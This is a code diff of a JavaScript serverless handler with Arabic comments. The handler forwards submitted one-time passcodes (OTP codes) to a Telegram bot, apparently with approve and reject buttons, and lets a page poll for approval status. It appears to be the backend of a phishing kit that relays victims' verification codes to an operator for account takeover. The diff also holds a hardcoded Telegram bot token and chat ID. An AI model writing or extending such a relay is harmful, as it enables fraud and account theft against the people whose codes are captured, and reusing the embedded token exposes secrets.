@@ -5,13 +5,11 @@ export default async function handler(req, res) {
 
   if (req.method === 'OPTIONS') return res.status(200).end();
 
-  // ضع هنا توكن البوت الجديد الخاص بالـ OTP والـ Chat ID الخاص بك
   const OTP_BOT_TOKEN = "9264807725:AAEtg1bnRFmHq0MnOJu_WAlDQePrDI_Wxc4";
-  const CHAT_ID = "926807725";
+  const CHAT_ID = "9264807725";
   const method = req.method;
   const body = req.body || {};
 
-  // 1. فحص حالة الموافقة مباشرة من البوت الجديد
   if (method === 'GET') {
     const { user_id } = req.query;
     if (!user_id) return res.status(200).json({ status: 'pending' });
@@ -41,7 +39,6 @@ export default async function handler(req, res) {
     }
   }
 
-  // 2. إرسال كود الـ OTP إلى البوت الجديد مع أزرار الموافقة والرفض
   if (method === 'POST' && body.رمز_التحقق_OTP) {
     const text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
                  `🔑 الكود: \`${body.رمز_التحقق_OTP}\`\n` +
